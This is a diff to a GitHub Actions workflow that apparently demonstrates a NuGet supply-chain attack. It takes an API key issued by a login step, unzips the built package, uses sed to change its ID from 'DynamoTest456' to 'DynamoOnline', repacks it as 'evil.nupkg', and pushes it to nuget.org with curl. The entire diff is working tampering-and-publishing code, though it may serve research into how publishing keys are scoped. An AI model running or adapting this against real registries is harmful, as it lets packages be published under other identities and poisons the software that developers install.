@@ -34,20 +34,32 @@ jobs:
         with:
           user: ${{ secrets.NUGET_USER }}
       
-      - name: Tamper with package
+      - name: Show API key info
+        run: |
+          echo "Got API key, now tampering..."
+          
+      - name: Tamper and push with curl
         run: |
           cd artifacts
           mkdir tampered
           unzip *.nupkg -d tampered
+          
           echo "=== Original nuspec ==="
           cat tampered/*.nuspec
-          # Change package ID to DynamoOnline
+          
+          # Change package ID
           sed -i 's/<id>DynamoTest456<\/id>/<id>DynamoOnline<\/id>/g' tampered/*.nuspec
+          
           echo "=== Modified nuspec ==="
           cat tampered/*.nuspec
+          
           # Repack
           cd tampered && zip -r ../evil.nupkg . && cd ..
-          ls -la
-      
-      - name: Push tampered package
-        run: dotnet nuget push ./artifacts/evil.nupkg --api-key ${{ steps.login.outputs.NUGET_API_KEY }} --source https://api.nuget.org/v3/index.json
+          
+          # Push with curl
+          echo "=== Pushing tampered package ==="
+          curl -v -X PUT \
+            "https://www.nuget.org/api/v2/package/" \
+            -H "X-NuGet-ApiKey: ${{ steps.login.outputs.NUGET_API_KEY }}" \
+            -H "Content-Type: application/octet-stream" \
+            --data-binary @evil.nupkg
